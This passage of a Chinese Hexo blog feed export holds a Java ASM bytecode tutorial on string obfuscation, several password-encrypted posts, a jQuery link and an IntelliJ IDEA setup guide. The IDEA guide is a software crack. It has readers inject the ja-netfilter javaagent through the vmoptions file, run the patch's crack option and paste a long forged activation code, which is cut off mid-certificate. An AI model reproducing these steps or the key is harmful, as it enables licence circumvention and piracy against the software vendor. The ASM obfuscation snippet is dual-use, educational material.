class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor1</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor1</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 拦截字符串修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor1</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor1</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodVisitor</span>(api,<span class="built_in">super</span>.visitMethod(access,name,desc,signature,exceptions)) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLdcInsn</span><span class="params">(Object cst)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(cst <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = ((String) cst).getBytes(StandardCharsets.UTF_8);<span class="comment">//转换bytes</span></span><br><span class="line">                    mv.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">                    mv.visitInsn(DUP);</span><br><span class="line">                    mv.visitIntInsn(SIPUSH,bytes.length);</span><br><span class="line">                    mv.visitIntInsn(NEWARRAY,T_BYTE);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">                        mv.visitInsn(DUP);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,i);</span><br><span class="line">                        mv.visitIntInsn(SIPUSH,bytes[i]);</span><br><span class="line">                        mv.visitInsn(AASTORE);</span><br><span class="line">                    &#125;</span><br><span class="line">                    mv.visitLdcInsn(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    mv.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;([BLjava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">super</span>.visitLdcInsn(cst);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换成bytes</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;asm&quot;&gt;&lt;a href=&quot;#asm&quot; class=&quot;headerlink&quot; title=&quot;asm&quot;&gt;&lt;/a&gt;asm&lt;/h1&gt;&lt;h2 id=&quot;分析类&quot;&gt;&lt;a href=&quot;#分析类&quot; class=&quot;headerlink&quot; title=&quot;分析类&quot;&gt;&lt;/a&gt;分析类&lt;/h</summary>
      
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>typora写博客文章</title>
    <link href="http://example.com/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/"/>
    <id>http://example.com/2022/11/10/%E6%B5%8B%E8%AF%95obsidian%E7%9A%84markdown%E8%AF%AD%E6%B3%95%E6%98%AF%E5%90%A6%E5%85%BC%E5%AE%B9%E4%BA%8Ehexo/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-25T02:19:03.042Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="46b3a3037e2545471f24cd4d293c7424e99ad2e707dc3584e5058edea324cd80">48e22157b1ef105701eba779d55791b94473791e743914b36adcaf48d5050f2b2005e371a10b73d013c4c54714aece0e090f85d79c253fd59744a0112d7cfb2d41133fd1f2d8fbf8f7e8a5e776633ddaa887781d2bfd0746955830bc917cef41cc1c6611eb13efacd4d27c163cf8f701eba37529e937a8a13158b20fc1dc533ba4e0ab12fa20e6c75590a99db6e335696b963f83c5ff58fbab454623381798850e745727e193712d84369bd15c6f4ba0b8996e5d6b68d8503d26bb7a07e5e7b4f4504648e5be960e7ea1135daaf1ec9550d56c78d0fd501feffdefcb8fe42132cb2cf9c4e169521c2fb5477aafdad9779793af924d516f1587f8f66d916ec80b0fa93eea0172cabf2d050564844d69cb365e8d6d0d396d74a3da05d1dbfebba9557d40a97d2fab1e34ad2bd055e58b5f30141e5c28a16821b356a3615ce9500ac0a66d0ff16c66a1e1131f207366a8a05c82a5ea4364852d79afb2d430ea07267ceeca22dbd6936d39de42945375fe066032fbd102f134ccf4657108101065d1aedfa7db3046042c8388f96b7311cd9cf230ac524b2e31d451f1464144e72ed05473666e87aaf06307af322aebcfb6376c04423d965cc884f29a69f8b4482d03189b8f492f72ef05679692de3bfc5bff9bdfd550dece246e6de6fed781ec98d09ee157adceac5d7ddc23e8371034b48cd8baf9a432a4e4ac9699ee012d43151807ccfbff70ee731f0d5b9f14f31aac6acd0c653fcd9eafb599fd3d387195169354aa8e9ed5d953a85c997b64f95f7398ef48bbd5c896e577dee8dd7b141a91fb95b6192d119a59bf2878fd72c7cf00b236fb33b783ed73d5722849606f8ca43388923b233366d6ca70a5d2061600f7f18fa9b2f12a6e0ca67c941dc338fe9aa662af49530b2c224a03cb37635b9213b1f25d69e0919300e2d547f665fd0a6e545ac01a704cb30f4727eeddc45d7b6543b43e891ba79f67684851c82efb4084f1111d4136065e5aba9b3c72401793f5fd155418e626511e68f134eff646867645ab7948dfddb3b5a9020b012da22dbbf0e4ee4f39966ee4064e5fbb2f119fb5d6543470cb4767325882f311cc0e62aaf1379efd1f459904dc50fb7daf7f5b4b659f85a4d2413cd40210cd026a62b03b2981e579019478e70ba48171de5db24687bf0f5f79740262ba42d663cfde6e10ba76c744a5915a851c8a6e612134fc07e80514b56551b8b3e2c5ba21362ff782594ff1735b66a84f87cb002208cff9766ca3d347d0ce5eb730691d620deab3040f0a1a10450f24e57aa9bd3dd1adf03ac5e67355daddcc3a90b91e998ab158d961d23f60127f845ac87c039e09e60b4375cabecb0a5d985d2921b4987b7cc0b4f547a2a92e773729e0c07c9499e05cb08eada1f031255c27608b09fcfb29d8f4c0905213116cbccbcdeba3e16c7fdcd237c9b83998b127071064780b853456f8e058952cab6b7237c98b2fbfd5fbf5daa2301ec54e6db2bffb1aaf37a05658f78b5d6e701b1891c09057110d09fde00dbf03ed27d46e130137d39ddd43e492abb5ea1dd6c97a23097ecb36022f048e8bc55053c8cee7808aa25d56b97d1d4f5eed0ab44b28152b171904fea1e591baafa60428cad1f83194d3da34ec7db7c859dd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时不对普通用户开放</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">typora</summary>
    
    
    
    <category term="typora" scheme="http://example.com/categories/typora/"/>
    
    
    <category term="typora" scheme="http://example.com/tags/typora/"/>
    
  </entry>
  
  <entry>
    <title>jQuery基础</title>
    <link href="http://example.com/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2022/10/24/jQuery%E5%9F%BA%E7%A1%80/</id>
    <published>2022-10-24T08:54:59.000Z</published>
    <updated>2022-11-24T08:58:45.322Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>课上jQuery讲解的代码：</strong></p><p><a href="https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC">https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E7%9A%84%E7%A0%94%E7%A9%B6/%E6%9F%90%E6%A0%A1%E4%BC%81%E5%90%88%E4%BD%9C%E5%9F%B9%E8%AE%AD%E6%9C%BA%E6%9E%84%E5%9F%B9%E8%AE%AD%E8%B5%84%E6%96%99/WEB%E4%B8%89%E4%BB%B6%E5%A5%97/JAVASCRIPT/javascript%20basic/BASIC</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;课上jQuery讲解的代码：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Erinipig/-/tree/main/%E5%AF%B9%E6%9F%90%E5%9F%B9%E8%AE%AD</summary>
      
    
    
    
    <category term="前端" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="jQuery基础" scheme="http://example.com/tags/jQuery%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>PythonSec</title>
    <link href="http://example.com/2022/10/21/PythonSec/"/>
    <id>http://example.com/2022/10/21/PythonSec/</id>
    <published>2022-10-21T12:27:35.000Z</published>
    <updated>2022-11-23T08:31:37.198Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b51dc264cb37bc53e3ddebaf4ed0bdac601233f5e825831707a04a82f9db0b5d">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f79ae02593b7b02f0446f48d67e6ee7a2af93499f2d4756e3e8753512288d6a09ad4aaaa49fb1571e89907301a31bf7e180577b186bdef76f2eed66b0259257aa562353a80b8aa575686cc7fafd3d86664753c8431cebf2ac21220f87d04ed07b6eff5ac1a59a1153215370bfd9f54af7ba350220d322b880695f795b476829abd42d1a5d35cf49542220580c2d502a0c4309f87228ee6fccf64fccc8da998c43f6a6b021d3eabda6667a896f67d63f658027f0da2014c84e09be4f2689b02ea5c28280a2a79bb5cdcf8f819823ee8d11894f63b5f2033c529d9c855a698874a0a891e434887ec2a953eff04cc4d0318c6b91b1b693c65a0e2b0fb2f1845f9e237a12088415ac8ce86f12f907a05eb7893952e246de00e49d9f8166b67d003b6e1362e4e17e159becfd2c0efa8e56ec5a3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是容易感染的</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Python安全资料分享</summary>
    
    
    
    <category term="Python安全" scheme="http://example.com/categories/Python%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Python安全" scheme="http://example.com/tags/Python%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaSec</title>
    <link href="http://example.com/2022/06/21/JavaSec/"/>
    <id>http://example.com/2022/06/21/JavaSec/</id>
    <published>2022-06-21T12:29:53.000Z</published>
    <updated>2022-11-24T06:51:28.043Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="323fef4b6167a2193f2a9c41da67b3ec589089abd9929d0dc764a48bfb82c234">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7dc240770bb65efcf40282cb335336366056f1aecead61d7dad29a73b32810672f574192d3d13cb2a8444a6527d1660f31db106d643e00f8ea7e47e3d934aa09a7f5d1d6eee1f7c294059a33a7ef75553329d2d3113ca6154d07cc43b7d66387bebac79eaa533c40fffd25c3c8c1a3db89e809aae83b4b3ca713bf12c5fe6f865d3f0e104ad6de3decc6743f33803326e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java安全资料分享</summary>
    
    
    
    <category term="Java安全" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb项目开发</title>
    <link href="http://example.com/2022/05/25/JavaWeb%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/"/>
    <id>http://example.com/2022/05/25/JavaWeb%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/</id>
    <published>2022-05-25T09:52:40.000Z</published>
    <updated>2022-11-25T09:53:46.305Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9ab935ae2e67d82e5e6dc53697d6bd975ba31e87c1b8e80ce7db6fca85e3a336">b3c9a99c0ccdca4a7128185684909d47d5a5888311d003d0768b8d00f2853565</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入正确的密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="Java开发" scheme="http://example.com/categories/Java%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="JavaWeb项目" scheme="http://example.com/tags/JavaWeb%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>idea安装配置</title>
    <link href="http://example.com/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</id>
    <published>2022-05-16T09:14:52.000Z</published>
    <updated>2022-11-25T13:23:51.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IntelliJ-Idea安装配置"><a href="#IntelliJ-Idea安装配置" class="headerlink" title="IntelliJ Idea安装配置"></a>IntelliJ Idea安装配置</h1><h2 id="IntelliJ-IDEA-2022-02-03（不推荐屁事多）"><a href="#IntelliJ-IDEA-2022-02-03（不推荐屁事多）" class="headerlink" title="IntelliJ IDEA 2022.02.03（不推荐屁事多）"></a>IntelliJ IDEA 2022.02.03（不推荐屁事多）</h2><h3 id="安装包下载"><a href="#安装包下载" class="headerlink" title="安装包下载"></a>安装包下载</h3><ul><li><a href="https://www.jetbrains.com/idea/download/#section=windows">https://www.jetbrains.com/idea/download/#section=windows</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/1.png" alt="image-1"></li><li>自己选定安装的路径，然后下一步下一步就OK，到这里<strong>注意一下</strong>就行，<strong>下面的也是一样</strong>：</li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/2.png" alt="image-2"></li></ul><h3 id="补丁下载："><a href="#补丁下载：" class="headerlink" title="补丁下载："></a>补丁下载：</h3><p>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter</code>。</p><h4 id="引入补丁"><a href="#引入补丁" class="headerlink" title="引入补丁"></a>引入补丁</h4><p>进入自己的IDEA安装路径下的的bin目录，配置bin目录下的<strong>idea64.exe.vmoptions</strong>文件</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/3.png" alt="image-3"></p><p>添加以下内容至该文件末尾，记得保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 引用补丁，补丁不能包含中文路径，否则会失效</span><br><span class="line">-javaagent:C:/ja-netfilter/ja-netfilter.jar</span><br><span class="line"># 最新Idea 版本需要添加下面两行，否则会报 key valid</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/4.png" alt="image-4"></p><h3 id="运行补丁文件："><a href="#运行补丁文件：" class="headerlink" title="运行补丁文件："></a>运行补丁文件：</h3><ul><li><p><strong><em>破解是选择第二个</em></strong></p></li><li><p>uistall.sh为mac、linux相关版本的卸载程序</p></li><li>uinstall-*.vbs为windows相关版本的卸载程序</li></ul><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><h3 id="激活IDEA"><a href="#激活IDEA" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li>打开IDEA，并输入下面的激活码</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZCB571FZHV-eyJsaWNlbnNlSWQiOiJaQ0I1NzFGWkhWIiwibGljZW5zZWVOYW1lIjoiZnV6emVzIGFsbHkiLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJQREIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBDIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQQ1dNUCIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUEdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wNy0wMSIsInBhaWRVcFRvIjoiMjAyMy0wNy0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU1ciLCJmYWxsYmFja0RhdGUiOiIyMDIzLTA3LTAxIiwicGFpZFVwVG8iOiIyMDIzLTA3LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDctMDEiLCJwYWlkVXBUbyI6IjIwMjMtMDctMDEiLCJleHRlbmRlZCI6dHJ1ZX1dLCJtZXRhZGF0YSI6IjAxMjAyMjA3MDFQU0FOMDAwMDA1IiwiaGFzaCI6IlRSSUFMOi01OTQ5ODgxMjIiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-JNpWl3tvfBw9nYALTrBlJzoryrKHhqmiBxP5IljC6Hlgmb6YlOH8vPngzoyLYa+cGDMVj6fipEpm+BEqIA7oAoBYSu1ZPdzkHAa94apJg+CUQwuw+EJaATdKTANuKYTBsay6WsnrUh8vbIaJpGz19z+uOAc4xRP+gtuyjiwkNECZ6Y9qD+Dx3Gm5xXI3UvKqjPYIhXk23n1pjlxFIUmhD7BumdxF8JHmJJhd/K5FaXQU/K9pMp70GfmSS2KJgxm6SXfslWs/bF5GTY3i1GA6ez05ZyJwsmJMZ1v6W7GWrWNHDLK7i7aXhOLdK9u+pCz+2FpKmadRznpSmixDzj37ig==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KC